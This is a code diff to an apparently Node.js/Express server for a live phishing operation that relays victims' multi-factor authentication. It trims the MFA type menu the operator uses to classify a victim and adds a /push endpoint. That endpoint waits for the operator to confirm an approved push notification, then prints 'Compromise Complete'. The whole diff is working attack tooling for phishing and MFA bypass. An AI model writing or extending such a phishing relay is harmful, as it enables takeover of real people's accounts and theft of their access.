@@ -56,12 +56,8 @@ app.post("/submit", async (req, res) => {
   var mfa_code = 0;
   var mfa_translation = {
     0: "Invalid Account",
-    1: "SMS",
-    2: "Call",
-    3: "Email",
-    4: "TOTP",
-    5: "Push Notification",
-    6: "Push Notification w/ Code"
+    1: "SMS", // covers all types of typed in passwords (TOTP/SMS/Call/Email)
+    2: "Push Notification", // covers both push types
    }
 
    // handle request accordingly
@@ -107,6 +103,16 @@ app.post("/submit", async (req, res) => {
   }
 });
 
+app.post("/push", async (req, res) => {
+  console.log("--------------Press a Key When Push Complete--------------")
+  await waitOnPush()
+  const response = {
+    status: 200
+  }
+  res.json(response)
+  console.log("------------------Compromise Complete---------------------\n")
+});
+
 function waitOnMFA() {
   // prompt user for code and return promise
   const rl = readline.createInterface({
@@ -114,7 +120,23 @@ function waitOnMFA() {
     output: process.stdout,
   });
 
-  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Call\n  3: Email\n  4: TOTP\n  5: Push Notificaiton\n  6: Push w/ Code\nWhat MFA does the user have? "
+  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Push Notificaiton\nWhat MFA does the user have? "
+  return new Promise(resolve => rl.question(query, ans => {
+    rl.close();
+    resolve(ans);
+  }))
+
+  return code;
+}
+
+function waitOnPush() {
+  // prompt user for code and return promise
+  const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+  });
+
+  const query = "..."
   return new Promise(resolve => rl.question(query, ans => {
     rl.close();
     resolve(ans);
